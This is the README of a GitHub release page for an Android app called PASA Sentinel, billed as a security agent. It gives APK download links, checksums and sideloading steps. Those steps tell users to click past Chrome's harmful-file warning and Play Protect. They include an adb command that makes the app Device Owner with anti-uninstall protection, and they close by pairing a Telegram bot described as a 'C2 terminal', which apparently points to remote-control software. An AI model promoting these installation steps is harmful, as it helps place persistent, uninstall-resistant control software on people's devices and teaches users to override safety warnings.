# 📦 PASA Sentinel APK Releases

This directory hosts verified production release binaries of **PASA Sentinel (Private Android Security Agent)**.

---

## 📥 Direct Downloads

| File | Release | Build | Size | Direct Link |
|---|---|---|---|---|
| **`pasa-v3.7.19-84.apk`** | `v3.7.19` (Latest Production) | Build 84 | 18.44 MB | [Download APK](https://github.com/rbr48/pasa/raw/main/releases/pasa-v3.7.19-84.apk) |
| **`pasa-latest.apk`** | Rolling Latest | Build 84 | 18.44 MB | [Download Latest](https://github.com/rbr48/pasa/raw/main/releases/pasa-latest.apk) |
| **`PASA-Device-Owner-Setup-Kit.zip`** | Guided Setup Wizard | Windows ADB | 12.3 KB | [Download Kit](https://github.com/rbr48/pasa/raw/main/releases/PASA-Device-Owner-Setup-Kit.zip) |

* **High-Speed Global CDN Mirror:** [https://pasa.izhaanintellect.fun/releases/pasa-latest.apk](https://pasa.izhaanintellect.fun/releases/pasa-latest.apk)
* **Historical Releases & OTA Manifest:** [https://pasa.izhaanintellect.fun/api/app/latest](https://pasa.izhaanintellect.fun/api/app/latest)
* **Public Audit & SARIF Portal:** [https://pasa.izhaanintellect.fun/audit/](https://pasa.izhaanintellect.fun/audit/)

---

## 🔐 Cryptographic Integrity (v3.7.19 Build 84)

Always verify the SHA-256 checksum before sideloading onto your phone:

* **File:** `pasa-v3.7.19-84.apk` / `pasa-latest.apk`
* **File Size:** `19,332,992 bytes` (18.44 MB)
* **SHA-256 Checksum:**
  ```text
  db0811cf5ecf0a5c9d98423330e03080f3e938a7fb2ee7def76e2edf2f46532c
  ```
* **Setup Kit SHA-256:**
  ```text
  7d1f99b6bfaf9975e570414bd1907b30e036952d3601601ee4cebde668080766
  ```
* **VirusTotal Multi-AV Consensus:** [Inspect Clean Report](https://www.virustotal.com/gui/file/db0811cf5ecf0a5c9d98423330e03080f3e938a7fb2ee7def76e2edf2f46532c)

### Verify Checksum:
- **Windows (PowerShell):**
  ```powershell
  Get-FileHash pasa-latest.apk -Algorithm SHA256
  ```
- **Linux / macOS:**
  ```bash
  sha256sum pasa-latest.apk
  ```

---

## 🚀 Quick Sideload & Installation

1. Transfer or download the APK to your Android device (Android 8.0 through Android 16).
2. If Chrome displays *"File might be harmful"*, tap **Download anyway** (standard for off-market sovereign packages).
3. If Google Play Protect shows an unknown app notice, tap **More details** → **Install anyway**.
4. To unlock Knox-grade Device Owner defense (anti-uninstall & lockscreen shade protection), connect via USB and execute:
   ```bash
   adb shell dpm set-device-owner com.izhaanintellect.pasa/.admin.PasaDeviceAdmin
   ```
5. Follow the [Complete Telegram Bot Setup Guide](../README.md#-complete-telegram-bot-setup-guide) in the main README to pair your C2 terminal!
